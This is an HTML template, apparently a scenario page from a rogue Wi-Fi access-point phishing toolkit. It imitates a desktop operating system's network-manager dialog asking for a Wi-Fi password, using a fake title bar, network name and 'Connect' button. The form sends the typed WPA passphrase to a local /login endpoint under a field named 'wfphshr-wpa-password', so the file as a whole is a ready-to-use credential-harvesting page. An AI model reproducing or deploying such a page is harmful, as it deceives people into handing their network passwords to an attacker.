<!DOCTYPE html>
<html lang="{{html_lang}}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{page_title}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #3a3a3a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .nm-window {
            width: 100%;
            max-width: 400px;
            background: #ececec;
            border-radius: 8px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(0, 0, 0, 0.12);
            overflow: hidden;
        }
        .title-bar {
            background: linear-gradient(180deg, #e4e4e4, #d8d8d8);
            padding: 8px 10px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #b8b8b8;
        }
        .title-bar .dots { display: flex; gap: 6px; flex-shrink: 0; }
        .title-bar .dot { width: 11px; height: 11px; border-radius: 50%; }
        .title-bar .dot.red { background: #ff5f57; border: 1px solid #e0443e; }
        .title-bar .dot.yellow { background: #febc2e; border: 1px solid #d4a017; }
        .title-bar .dot.green { background: #28c840; border: 1px solid #1aab29; }
        .title-bar .title {
            flex: 1;
            text-align: center;
            color: #4a4a4a;
            font-size: 0.8rem;
            font-weight: 600;
            padding-right: 52px;
        }
        .body { padding: 22px 20px 18px; background: #ececec; }
        .wifi-icon { text-align: center; margin-bottom: 14px; }
        .wifi-icon svg { width: 44px; height: 44px; vertical-align: middle; }
        h2 {
            color: #2d2d2d;
            font-size: 0.88rem;
            text-align: center;
            margin-bottom: 4px;
            font-weight: 600;
        }
        .network-name {
            text-align: center;
            color: #1a5f9e;
            font-size: 1rem;
            font-weight: 600;
            margin-bottom: 12px;
        }
        .msg {
            color: #5a5a5a;
            font-size: 0.75rem;
            text-align: center;
            margin-bottom: 18px;
            line-height: 1.4;
        }
        label[for="psk"] {
            display: block;
            font-size: 0.72rem;
            color: #444;
            margin-bottom: 5px;
            font-weight: 500;
        }
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 9px 11px;
            background: #fff;
            border: 1px solid #b0b0b0;
            border-radius: 4px;
            color: #222;
            font-size: 0.88rem;
            margin-bottom: 12px;
        }
        input:focus {
            outline: none;
            border-color: #4a90d9;
            box-shadow: 0 0 0 2px rgba(74, 144, 217, 0.2);
        }
        .show-pass {
            display: flex;
            align-items: center;
            gap: 7px;
            font-size: 0.75rem;
            color: #555;
            margin-bottom: 18px;
        }
        .show-pass label { margin: 0; font-weight: 400; cursor: pointer; }
        .btn-row { display: flex; gap: 8px; justify-content: flex-end; flex-wrap: wrap; }
        .btn {
            padding: 7px 18px;
            border: 1px solid #999;
            border-radius: 4px;
            font-size: 0.8rem;
            cursor: pointer;
            font-family: inherit;
        }
        .btn-cancel { background: linear-gradient(180deg, #fafafa, #e8e8e8); color: #333; }
        .btn-connect {
            background: linear-gradient(180deg, #4a9ee8, #2d7dd2);
            color: #fff;
            font-weight: 600;
            border-color: #256bb8;
        }
        .btn-connect:hover { filter: brightness(1.05); }
    </style>
</head>
<body>
    <div class="nm-window">
        <div class="title-bar">
            <div class="dots">
                <div class="dot red"></div>
                <div class="dot yellow"></div>
                <div class="dot green"></div>
            </div>
            <div class="title">{{window_title}}</div>
        </div>
        <div class="body">
            <div class="wifi-icon" aria-hidden="true">
                <svg viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2" stroke-linecap="round">
                    <path d="M5 12.55a11 11 0 0 1 14.08 0"/>
                    <path d="M1.42 9a16 16 0 0 1 21.16 0"/>
                    <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
                    <line x1="12" y1="20" x2="12.01" y2="20"/>
                </svg>
            </div>
            <h2>{{auth_required_for}}</h2>
            <p class="network-name">{{network_name}}</p>
            <p class="msg">{{enter_password_msg}}</p>
            <form method="POST" action="/login">
                <label for="psk">{{label_password}}</label>
                <input type="password" id="psk" name="wfphshr-wpa-password" placeholder="{{placeholder_password}}" required autocomplete="current-password">
                <div class="show-pass">
                    <input type="checkbox" id="show" aria-describedby="psk">
                    <label for="show">{{show_password}}</label>
                </div>
                <div class="btn-row">
                    <button type="button" class="btn btn-cancel">{{btn_cancel}}</button>
                    <button type="submit" class="btn btn-connect">{{btn_connect}}</button>
                </div>
            </form>
        </div>
    </div>
    <script>
        (function () {
            var cb = document.getElementById("show");
            var psk = document.getElementById("psk");
            if (cb && psk) {
                cb.addEventListener("change", function () {
                    psk.type = cb.checked ? "text" : "password";
                });
            }
        })();
    </script>
</body>
</html>
